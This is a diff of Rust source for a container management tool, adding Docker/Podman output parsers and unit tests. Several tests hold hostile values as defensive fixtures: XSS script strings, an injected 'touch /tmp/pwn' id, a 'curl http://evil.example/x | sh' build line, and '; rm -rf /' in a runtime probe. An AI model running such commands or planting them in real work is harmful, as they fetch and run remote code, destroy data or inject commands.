+        .find_map(|line| line.trim().split_once('\t'))
+        .ok_or_else(|| {
+            CoreError::validation(
+                "container state",
+                "runtime returned an invalid state record",
+            )
+        })?;
     validate_container_id(id)?;
     if id != container.id() {
         return Err(CoreError::validation(
@@ -5276,10 +5845,25 @@ fn parse_state_probe(container: &ContainerIdentity, output: &str) -> CoreResult<
     normalize_state(state)
 }
 
+/// Reads one JSON object per line out of a runtime's output.
+///
+/// Container runtimes write diagnostics to stderr and the transport folds
+/// stderr into the same stream, so a perfectly good listing can arrive with a
+/// deprecation notice sitting in the middle of it. Podman's cgroups-v1 warning
+/// alone was enough to make every list on such a host fail to parse.
+///
+/// The rule is: a line that does not even begin as an object is not data and
+/// is passed over; a line that begins as an object and will not parse is
+/// corrupt data and is still an error. Dropping the second kind would turn a
+/// truncated row into a silently shorter list.
 fn json_rows(output: &str, subject: &'static str) -> CoreResult<(Vec<Map<String, Value>>, bool)> {
     let mut rows = Vec::new();
     let mut truncated = false;
     for line in output.lines().filter(|line| !line.trim().is_empty()) {
+        let line = line.trim();
+        if !line.starts_with('{') {
+            continue;
+        }
         if rows.len() == MAX_COLLECTION_ROWS {
             truncated = true;
             break;
@@ -5293,6 +5877,151 @@ fn json_rows(output: &str, subject: &'static str) -> CoreResult<(Vec<Map<String,
         rows.push(object);
     }
     Ok((rows, truncated))
+}
+
+/// A required string under whichever of these keys the runtime used.
+///
+/// Docker writes `ID`; Podman writes `Id`. Both are the same fact, and a
+/// parser that knows only one of them cannot read the other runtime at all.
+fn required_json_alias(row: &Map<String, Value>, keys: &[&str]) -> CoreResult<String> {
+    for key in keys {
+        if let Some(value) = row.get(*key).and_then(Value::as_str)
+            && !value.is_empty()
+        {
+            return Ok(sanitize_line(value, 256));
+        }
+    }
+    Err(CoreError::validation(
+        "container runtime output",
+        format!("missing {}", keys.join(" or ")),
+    ))
+}
+
+/// The first line that says anything, from output a runtime may have padded
+/// with its own diagnostics.
+///
+/// Used where the answer is a single word and the whole output would otherwise
+/// be compared against it.
+fn first_output_line(output: &str) -> &str {
+    output
+        .lines()
+        .map(str::trim)
+        .find(|line| !line.is_empty())
+        .unwrap_or("")
+}
+
+/// The JSON array inside output a runtime may have prefixed with diagnostics.
+///
+/// `inspect` answers with one array; Podman greets the same command with a
+/// deprecation warning on stderr, which the transport folds into this stream.
+/// Trimming to the outermost brackets keeps that warning from costing the
+/// whole audit. Anything between them that is not valid JSON still fails at
+/// the parse, so this widens what is accepted without loosening what is
+/// believed.
+fn json_array_body(output: &str) -> &str {
+    let Some(start) = output.find('[') else {
+        return output;
+    };
+    let Some(end) = output.rfind(']') else {
+        return output;
+    };
+    if end < start {
+        return output;
+    }
+    &output[start..=end]
+}
+
+/// An optional string under whichever of these keys the runtime used.
+fn json_alias_text(row: &Map<String, Value>, keys: &[&str], maximum: usize) -> String {
+    for key in keys {
+        let text = json_text(row, key, maximum);
+        if !text.is_empty() {
+            return text;
+        }
+    }
+    String::new()
+}
+
+/// A flag under whichever of these keys the runtime used.
+fn json_alias_bool(row: &Map<String, Value>, keys: &[&str]) -> bool {
+    keys.iter().any(|key| json_bool(row, key))
+}
+
+/// The first of these that says anything.
+fn first_non_empty(candidates: &[String]) -> String {
+    candidates
+        .iter()
+        .find(|value| !value.trim().is_empty())
+        .cloned()
+        .unwrap_or_default()
+}
+
+/// The container's name, from a string or from a list of them.
+///
+/// Docker prints one name; Podman prints an array, because a container really
+/// can have several. The first is the one every other tool shows, and the rest
+/// are aliases the operator did not ask about here.
+fn container_name(row: &Map<String, Value>) -> String {
+    match row.get("Names") {
+        Some(Value::Array(values)) => values
+            .first()
+            .map(|value| value_text(value, 256))
+            .unwrap_or_default(),
+        Some(value) => value_text(value, 256).trim_start_matches('/').to_owned(),
+        None => String::new(),
+    }
+}
+
+/// The published ports, from a string or from a list of port objects.
+///
+/// Docker pre-renders `127.0.0.1:8080->80/tcp`. Podman hands back structured
+/// entries, so the same line is built here rather than dumping raw JSON into
+/// a column an operator has to read.
+fn container_ports(row: &Map<String, Value>) -> String {
+    let Some(Value::Array(entries)) = row.get("Ports") else {
+        return json_text(row, "Ports", 4_096);
+    };
+    let mut rendered = Vec::new();
+    for entry in entries {
+        let Some(entry) = entry.as_object() else {
+            continue;
+        };
+        let host_port = entry.get("host_port").and_then(Value::as_u64).unwrap_or(0);
+        let container_port = entry
+            .get("container_port")
+            .and_then(Value::as_u64)
+            .unwrap_or(0);
+        let protocol = entry
+            .get("protocol")
+            .and_then(Value::as_str)
+            .unwrap_or("tcp");
+        let host_ip = entry.get("host_ip").and_then(Value::as_str).unwrap_or("");
+        if host_port == 0 {
+            rendered.push(format!("{container_port}/{protocol}"));
+        } else if host_ip.is_empty() {
+            rendered.push(format!("{host_port}->{container_port}/{protocol}"));
+        } else {
+            rendered.push(format!(
+                "{host_ip}:{host_port}->{container_port}/{protocol}"
+            ));
+        }
+    }
+    sanitize_line(&rendered.join(", "), 4_096)
+}
+
+/// A field that is a string on one runtime and a list of words on the other.
+fn text_or_joined(row: &Map<String, Value>, key: &str, maximum: usize) -> String {
+    match row.get(key) {
+        Some(Value::Array(values)) => sanitize_line(
+            &values
+                .iter()
+                .map(|value| value_text(value, maximum))
+                .collect::<Vec<_>>()
+                .join(" "),
+            maximum,
+        ),
+        _ => json_text(row, key, maximum),
+    }
 }
 
 fn required_json_text(row: &Map<String, Value>, key: &'static str) -> CoreResult<String> {
@@ -5398,6 +6127,11 @@ mod tests {
         let store = PortableStore::prepare(root.0.clone()).unwrap();
         let services = BackendServices::new(store).unwrap();
         (root, services)
+    }
+
+    /// A terminal id the way the caller supplies one.
+    fn terminal_id() -> String {
+        format!("container-{}", uuid::Uuid::new_v4())
     }
 
     async fn terminal_test_services() -> (
@@ -5885,6 +6619,173 @@ mod tests {
         assert!(network_inspect_command(&forged).is_err());
     }
 
+    fn sample_image() -> ContainerImage {
+        ContainerImage {
+            runtime: ContainerRuntime::Docker,
+            id: format!("sha256:{CONTAINER_A}"),
+            repository: "incident-tools".to_owned(),
+            tag: "latest".to_owned(),
+            digest: "<none>".to_owned(),
+            created_at: "2026-04-16 23:53:26 +0000 UTC".to_owned(),
+            size: "12.2MB".to_owned(),
+        }
+    }
+
+    /// The reason to read an image at all is to see what it will do and how it
+    /// was built, so both have to survive the typed boundary intact — text the
+    /// image author controls included.
+    #[test]
+    fn image_inspection_is_exact_typed_and_preserves_hostile_text_as_data() {
+        let expected = sample_image();
+        assert_eq!(
+            image_inspect_command(&expected).unwrap(),
+            format!("docker image inspect -- 'sha256:{CONTAINER_A}'")
+        );
+        let output = serde_json::json!([{
+            "Id": format!("sha256:{CONTAINER_A}"),
+            "Created": "2026-04-16T23:53:26.1Z",
+            "Architecture": "amd64",
+            "Os": "linux",
+            "Author": "</div><script>evil()</script>",
+            "RepoTags": ["incident-tools:latest"],
+            "RepoDigests": [],
+            "RootFS": {"Type": "layers", "Layers": ["sha256:aa", "sha256:bb"]},
+            "Config": {
+                "User": "",
+                "Entrypoint": ["/bin/sh", "-c"],
+                "Cmd": ["sleep", "infinity"],
+                "WorkingDir": "/srv",
+                "Env": ["PATH=/usr/bin", "API_TOKEN=<img src=x onerror=evil()>"],
+                "ExposedPorts": {"8080/tcp": {}, "443/tcp": {}},
+                "Volumes": {"/data": {}},
+                "Labels": {"maintainer": "<script>label()</script>"}
+            }
+        }])
+        .to_string();
+        let inspection = parse_image_inspection(&expected, &output).unwrap();
+        assert_eq!(inspection.author, "</div><script>evil()</script>");
+        assert_eq!(inspection.entrypoint, vec!["/bin/sh", "-c"]);
+        assert_eq!(inspection.command, vec!["sleep", "infinity"]);
+        assert_eq!(inspection.working_dir, "/srv");
+        assert_eq!(inspection.environment[1], "API_TOKEN=<img src=x onerror=evil()>");
+        assert_eq!(inspection.exposed_ports, vec!["443/tcp", "8080/tcp"]);
+        assert_eq!(inspection.declared_volumes, vec!["/data"]);
+        assert_eq!(inspection.layers.len(), 2);
+        assert_eq!(
+            inspection.labels.get("maintainer").unwrap(),
+            "<script>label()</script>"
+        );
+        // The listing keeps the columns the inspection does not restate, so a
+        // reader is not shown a blank size or an empty repository.
+        assert_eq!(inspection.image.repository, "incident-tools");
+        assert_eq!(inspection.image.size, "12.2MB");
+
+        // A record for a different image is refused outright.
+        let wrong = output.replacen(CONTAINER_A, CONTAINER_B, 1);
+        assert!(parse_image_inspection(&expected, &wrong).is_err());
+        assert!(parse_image_inspection(&expected, "[]").is_err());
+        let mut forged = expected;
+        forged.id = "bad; touch /tmp/pwn".to_owned();
+        assert!(image_inspect_command(&forged).is_err());
+        assert!(image_history_command(&forged).is_err());
+    }
+
+    /// Podman names these fields differently *and* gives two of them as
+    /// numbers, so a listing that only knows Docker's shape shows an empty
+    /// size column and a run of digits where the date belongs.
+    #[test]
+    fn image_listing_reads_both_runtimes_own_field_names_and_number_shapes() {
+        let docker = serde_json::json!({
+            "ID": format!("sha256:{CONTAINER_A}"),
+            "Repository": "alpine", "Tag": "3.20", "Digest": "<none>",
+            "CreatedAt": "2026-04-16 23:53:26 +0000 UTC", "Size": "12.2MB"
+        })
+        .to_string();
+        let parsed = parse_images(ContainerRuntime::Docker, &docker).unwrap();
+        assert_eq!(parsed.items[0].size, "12.2MB");
+        assert_eq!(parsed.items[0].created_at, "2026-04-16 23:53:26 +0000 UTC");
+
+        let podman = serde_json::json!({
+            "Id": CONTAINER_A, "repository": "localhost/alpine", "tag": "3.20",
+            "Digest": "sha256:abc", "Created": 1_776_383_606_i64, "Size": 8_104_044_i64
+        })
+        .to_string();
+        let parsed = parse_images(ContainerRuntime::Podman, &podman).unwrap();
+        assert_eq!(parsed.items[0].repository, "localhost/alpine");
+        assert_eq!(parsed.items[0].id, CONTAINER_A);
+        // Not "8104044", and not "1776383606". The date is the same instant
+        // the Docker listing above spells out longhand, which is the check
+        // that the conversion is right and not merely plausible.
+        assert_eq!(parsed.items[0].size, "8.1MB");
+        assert_eq!(parsed.items[0].created_at, "2026-04-16 23:53:26 UTC");
+        assert_eq!(parsed.items[0].runtime, ContainerRuntime::Podman);
+    }
+
+    #[test]
+    fn byte_counts_are_written_the_way_the_other_runtime_writes_them() {
+        assert_eq!(human_bytes(0), "0B");
+        assert_eq!(human_bytes(999), "999B");
+        assert_eq!(human_bytes(1_000), "1.0kB");
+        assert_eq!(human_bytes(8_104_044), "8.1MB");
+        assert_eq!(human_bytes(2_500_000_000), "2.5GB");
+    }
+
+    /// The two forms of one id mean one image. A runtime that prints the
+    /// prefix in the inspection but not in the listing must not read as a
+    /// mismatch, or every Podman image would refuse to open.
+    #[test]
+    fn image_identity_matches_across_the_sha256_prefix() {
+        let bare = ContainerImage {
+            id: CONTAINER_A.to_owned(),
+            ..sample_image()
+        };
+        let prefixed = serde_json::json!([{
+            "Id": format!("sha256:{CONTAINER_A}"), "Config": {}
+        }])
+        .to_string();
+        assert!(parse_image_inspection(&bare, &prefixed).is_ok());
+        assert_eq!(bare.short_id(), &CONTAINER_A[..12]);
+        assert_eq!(sample_image().short_id(), &CONTAINER_A[..12]);
+        assert_eq!(
+            sample_image().stable_key(),
+            format!("docker:image:sha256:{CONTAINER_A}")
+        );
+    }
+
+    /// A layer's build instruction is the whole point of reading history, and
+    /// `<missing>` is the runtime's real answer for a pulled layer rather than
+    /// an error to hide.
+    #[test]
+    fn image_history_keeps_build_instructions_whole_and_reports_missing_layer_ids() {
+        let output = [
+            serde_json::json!({
+                "ID": format!("sha256:{CONTAINER_A}"),
+                "CreatedAt": "2026-04-16T23:53:26Z",
+                "CreatedBy": "RUN /bin/sh -c curl http://evil.example/x | sh # buildkit",
+                "Size": "4.1MB",
+                "Comment": "buildkit.dockerfile.v0"
+            })
+            .to_string(),
+            serde_json::json!({
+                "ID": "<missing>",
+                "CreatedAt": "2026-04-01T00:00:00Z",
+                "CreatedBy": "/bin/sh -c #(nop) ADD file:abc in / ",
+                "Size": "8.1MB",
+                "Comment": ""
+            })
+            .to_string(),
+        ]
+        .join("\n");
+        let history = parse_image_history(&output).unwrap();
+        assert_eq!(history.len(), 2);
+        assert_eq!(
+            history[0].created_by,
+            "RUN /bin/sh -c curl http://evil.example/x | sh # buildkit"
+        );
+        assert_eq!(history[1].id, "<missing>");
+        assert_eq!(history[1].size, "8.1MB");
+    }
+
     #[test]
     fn compose_inventory_is_sorted_bounded_and_never_executes_config_paths() {
         let hostile_config = "</div><script>compose_evil()</script>";
@@ -6239,13 +7140,48 @@ mod tests {
         assert_eq!(calls.load(Ordering::SeqCst), 1);
     }
 
+    /// The caller's id has to be the one the session answers to.
+    ///
+    /// This minted its own instead, and the caller matches every event against
+    /// the id it reserved — so the terminal opened, and then the first poll
+    /// failed as a protocol violation and the window was dead. Both sides were
+    /// individually correct and their unit tests both passed; only opening a
+    /// real shell and typing into it showed it.
+    #[tokio::test]
+    async fn container_terminal_answers_to_the_id_its_caller_gave_it() {
+        let (_root, services, _harness, session) = terminal_test_services().await;
+        let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
+        let requested = terminal_id();
+        let terminal = services
+            .docker()
+            .open_terminal(
+                &session,
+                &container,
+                ContainerShell::Sh,
+                requested.clone(),
+                80,
+                24,
+            )
+            .await
+            .unwrap();
+        assert_eq!(terminal.terminal_id(), requested);
+        TerminalTransport::close(&terminal).await.unwrap();
+    }
+
     #[tokio::test]
     async fn container_terminal_uses_only_typed_runtime_identity_and_shell() {
         let (_root, services, harness, session) = terminal_test_services().await;
         let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
         let terminal = services
             .docker()
-            .open_terminal(&session, &container, ContainerShell::Bash, 120, 40)
+            .open_terminal(
+                &session,
+                &container,
+                ContainerShell::Bash,
+                terminal_id(),
+                120,
+                40,
+            )
             .await
             .unwrap();
 
@@ -6269,7 +7205,7 @@ mod tests {
         assert!(
             services
                 .docker()
-                .open_terminal(&session, &forged, ContainerShell::Sh, 80, 24)
+                .open_terminal(&session, &forged, ContainerShell::Sh, terminal_id(), 80, 24)
                 .await
                 .is_err()
         );
@@ -6286,7 +7222,14 @@ mod tests {
             .unwrap();
         let wrong_target = services
             .docker()
-            .open_terminal(&session, &container, ContainerShell::Ash, 80, 24)
+            .open_terminal(
+                &session,
+                &container,
+                ContainerShell::Ash,
+                terminal_id(),
+                80,
+                24,
+            )
             .await;
         assert!(matches!(wrong_target, Err(CoreError::TargetChanged { .. })));
         assert!(harness.terminal_launches().is_empty());
@@ -6295,7 +7238,14 @@ mod tests {
         let terminal = Arc::new(
             services
                 .docker()
-                .open_terminal(&session, &container, ContainerShell::Ash, 80, 24)
+                .open_terminal(
+                    &session,
+                    &container,
+                    ContainerShell::Ash,
+                    terminal_id(),
+                    80,
+                    24,
+                )
                 .await
                 .unwrap(),
         );
@@ -6331,7 +7281,14 @@ mod tests {
         let terminal = Arc::new(
             services
                 .docker()
-                .open_terminal(&session, &container, ContainerShell::Sh, 80, 24)
+                .open_terminal(
+                    &session,
+                    &container,
+                    ContainerShell::Sh,
+                    terminal_id(),
+                    80,
+                    24,
+                )
                 .await
                 .unwrap(),
         );
@@ -6532,6 +7489,197 @@ mod tests {
                 crate::operations::JournalPhase::Restored,
             ]
         );
+    }
+
+    /// Podman prints the same command's output in a different shape.
+    ///
+    /// The row below is what `podman ps -a --no-trunc --format '{{json .}}'`
+    /// actually returned on the lab host, trimmed to the fields the parser
+    /// reads. Five of them differ from Docker: `Id` not `ID`, `Names` as a
+    /// list, `Status` empty with the state in `State`, `CreatedAt` empty with
+    /// the time in `Created`, and `Ports` as structured entries. Reading only
+    /// Docker's names made every Podman host answer "no containers" — the
+    /// worst kind of wrong answer, because it looks like an answer.
+    #[test]
+    fn the_container_list_reads_podman_rows_as_well_as_docker_rows() {
+        let podman = serde_json::json!({
+            "Id": CONTAINER_A,
+            "Names": ["app-frontend"],
+            "Image": "localhost/alpine:3.20",
+            "State": "running",
+            "Status": "",
+            "Created": "2026-08-27T02:07:37.860716641Z",
+            "CreatedAt": "",
+            "Ports": [{
+                "host_ip": "127.0.0.1",
+                "host_port": 8080u64,
+                "container_port": 80u64,
+                "protocol": "tcp"
+            }],
+            "Command": ["sh", "-c", "sleep infinity"]
+        })
+        .to_string();
+        let parsed = parse_container_list(ContainerRuntime::Podman, &podman).unwrap();
+        let row = &parsed.items[0];
+        assert_eq!(row.identity.id(), CONTAINER_A);
+        assert_eq!(row.identity.runtime(), ContainerRuntime::Podman);
+        assert_eq!(row.name, "app-frontend");
+        assert_eq!(row.image, "localhost/alpine:3.20");
+        assert_eq!(row.state, "running");
+        // An empty status column would read as "unknown", not "running".
+        assert_eq!(row.status, "running");
+        assert_eq!(row.created_at, "2026-08-27T02:07:37.860716641Z");
+        // Rendered the way the operator reads it elsewhere, not as raw JSON.
+        assert_eq!(row.ports, "127.0.0.1:8080->80/tcp");
+        assert_eq!(row.command, "sh -c sleep infinity");
+
+        // Docker's shape still reads exactly as before.
+        let docker = serde_json::json!({
+            "ID": CONTAINER_B,
+            "Names": "/api",
+            "Image": "api:1",
+            "State": "exited",
+            "Status": "Exited (0) 2 minutes ago",
+            "CreatedAt": "2026-08-27 01:00:00 +0000 UTC",
+            "Ports": "0.0.0.0:9090->9090/tcp",
+            "Command": "\"/entrypoint.sh\""
+        })
+        .to_string();
+        let parsed = parse_container_list(ContainerRuntime::Docker, &docker).unwrap();
+        let row = &parsed.items[0];
+        assert_eq!(row.identity.id(), CONTAINER_B);
+        assert_eq!(row.name, "api");
+        assert_eq!(row.status, "Exited (0) 2 minutes ago");
+        assert_eq!(row.created_at, "2026-08-27 01:00:00 +0000 UTC");
+        assert_eq!(row.ports, "0.0.0.0:9090->9090/tcp");
+
+        // A row with neither id key is still refused: an unnamed container is
+        // one no later command could act on.
+        let anonymous = serde_json::json!({"Names": ["ghost"]}).to_string();
+        assert!(parse_container_list(ContainerRuntime::Podman, &anonymous).is_err());
+    }
+
+    /// A runtime's own diagnostics must not cost the operator the listing.
+    ///
+    /// stderr is folded into the same stream, and Podman greets every command
+    /// on a cgroups-v1 host with a deprecation warning. One such line used to
+    /// make the entire list fail to parse — the host looked broken because the
+    /// runtime had been chatty.
+    #[test]
+    fn runtime_warnings_do_not_cost_the_listing_but_corrupt_rows_still_do() {
+        let real_warning = concat!(
+            "time=\"2026-08-27T02:07:38Z\" level=warning ",
+            "msg=\"Using cgroups-v1 which is deprecated in favor of cgroups-v2\"\n"
+        );
+        let row = serde_json::json!({
+            "Id": CONTAINER_A,
+            "Names": ["app-frontend"],
+            "State": "running"
+        })
+        .to_string();
+
+        for output in [
+            format!("{real_warning}{row}\n"),
+            format!("{row}\n{real_warning}"),
+            format!("WARNING: bridge-nf-call-iptables is disabled\n{row}\n"),
+        ] {
+            let parsed = parse_container_list(ContainerRuntime::Podman, &output).unwrap();
+            assert_eq!(parsed.items.len(), 1, "warning swallowed the listing");
+            assert_eq!(parsed.items[0].name, "app-frontend");
+        }
+
+        // A line that starts as an object and will not parse is a truncated
+        // row, not chatter. Dropping it would quietly shorten the list.
+        let truncated = format!("{row}\n{{\"Id\": \"cut-off");
+        assert!(parse_container_list(ContainerRuntime::Podman, &truncated).is_err());
+    }
+
+    /// Which runtime a host has decides every command after it, so the probe
+    /// reads what the host said and never fills a gap with a guess.
+    #[test]
+    fn the_runtime_probe_reads_what_is_there_and_invents_nothing() {
+        // Nothing installed. "No container runtime" and "Docker with a
+        // stopped daemon" have to stay different answers.
+        let empty = parse_runtime_probe("");
+        assert_eq!(empty.usable, None);
+        assert!(empty.installed.is_empty());
+
+        let stopped = parse_runtime_probe("docker\tinstalled\n");
+        assert_eq!(stopped.usable, None);
+        assert_eq!(stopped.installed, vec![ContainerRuntime::Docker]);
+
+        // The common domestic-distro shape: Podman and no Docker at all.
+        let podman = parse_runtime_probe("podman\tusable\n");
+        assert_eq!(podman.usable, Some(ContainerRuntime::Podman));
+        assert_eq!(podman.installed, vec![ContainerRuntime::Podman]);
+
+        // Both answering: Docker wins, because a host with both keeps its
+        // workloads there.
+        let both = parse_runtime_probe("docker\tusable\npodman\tusable\n");
+        assert_eq!(both.usable, Some(ContainerRuntime::Docker));
+        assert_eq!(
+            both.installed,
+            vec![ContainerRuntime::Docker, ContainerRuntime::Podman]
+        );
+
+        // Docker present but dead, Podman alive: the one that answers is used.
+        let mixed = parse_runtime_probe("docker\tinstalled\npodman\tusable\n");
+        assert_eq!(mixed.usable, Some(ContainerRuntime::Podman));
+
+        // A hostile or unexpected name must not become a runtime. This value
+        // chooses which binary later commands run.
+        let hostile = parse_runtime_probe("dockerx\tusable\n; rm -rf /\tusable\npodman\tusable\n");
+        assert_eq!(hostile.usable, Some(ContainerRuntime::Podman));
+        assert_eq!(hostile.installed, vec![ContainerRuntime::Podman]);
+    }
+
+    /// The state probe's separator has to be one the runtime actually emits.
+    ///
+    /// A bare `\t` inside `--format` reaches a Go template, which prints it as
+    /// a backslash and a `t`. The parser splits on a real tab, so the probe
+    /// returned "invalid state record" for every container that exists, and
+    /// no action could be planned at all. Every unit test around it fed the
+    /// parser a synthetic string that already had a real tab, so none noticed.
+    #[test]
+    fn the_state_probe_asks_for_a_separator_the_runtime_will_really_print() {
+        let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
+        let command = format!(
+            "{} inspect --format '{{{{.Id}}}}{{{{\"\\t\"}}}}{{{{.State.Status}}}}' -- {}",
+            container.runtime.command(),
+            shq(container.id())
+        );
+        // Go prints a quoted escape; it passes an unquoted one straight
+        // through. Only the first produces the byte the parser looks for.
+        assert!(command.contains(r#"{{"\t"}}"#));
+        assert!(!command.contains(r#"}}\t{{"#));
+        assert_eq!(
+            parse_state_probe(&container, &format!("{CONTAINER_A}\trunning")).unwrap(),
+            "running"
+        );
+        // What the runtime prints when the escape is left unquoted.
+        assert!(parse_state_probe(&container, &format!("{CONTAINER_A}\\trunning")).is_err());
+    }
+
+    /// The shell probe has to survive the two things that actually reach it:
+    /// a runtime warning printed ahead of the answer, and an image that has no
+    /// shell at all.
+    #[test]
+    fn the_shell_probe_prefers_bash_tolerates_noise_and_admits_when_there_is_none() {
+        assert_eq!(parse_shell_probe("bash\n").unwrap(), ContainerShell::Bash);
+        assert_eq!(parse_shell_probe("ash\n").unwrap(), ContainerShell::Ash);
+        assert_eq!(parse_shell_probe("sh\n").unwrap(), ContainerShell::Sh);
+        // Podman on a cgroups-v1 host prints this in front of every command.
+        assert_eq!(
+            parse_shell_probe("time=\"...\" level=warning msg=\"Using cgroups-v1\"\nbash\n")
+                .unwrap(),
+            ContainerShell::Bash,
+        );
+        // A distroless or scratch image: the exec produced nothing.
+        assert!(parse_shell_probe("").is_err());
+        assert!(parse_shell_probe("some unrelated warning\n").is_err());
+        // The loop asks in preference order, so the first hit is the best one
+        // available rather than whichever the image happens to list first.
+        assert!(SHELL_PROBE_SCRIPT.contains("for lr_sh in bash ash sh"));
     }
 
     #[test]
